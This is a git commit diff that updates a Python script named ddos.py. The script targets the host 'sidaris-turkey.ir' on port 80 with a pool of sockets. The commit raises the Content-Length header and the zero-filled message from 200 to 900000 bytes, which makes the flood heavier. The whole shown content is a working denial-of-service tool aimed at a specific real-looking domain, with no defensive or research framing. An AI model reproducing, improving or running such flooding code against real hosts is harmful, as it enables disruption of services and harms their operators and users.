03075d178543145ac0ed97be0845bc09f2dbb6b8
S13cko <125689079+S13cko@users.noreply.github.com>
2023-02-17 21:46:50 +0330

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -2,7 +2,7 @@ import socket
 
 HOST = "sidaris-turkey.ir"
 PORT = 80
-HEADERS = "Content-Length: 200\r\nContent-Type: text/plain\r\n\r\n"
+HEADERS = "Content-Length: 900000\r\nContent-Type: text/plain\r\n\r\n"
 POOL_SIZE = 10
 
 # Create a pool of sockets
@@ -12,7 +12,7 @@ for i in range(POOL_SIZE):
     pool.append(client)
 
 # Fill the message buffer with 0s
-message = b'0' * 200
+message = b'0' * 900000
 
 # Select a socket from the pool
 pool_index = 0
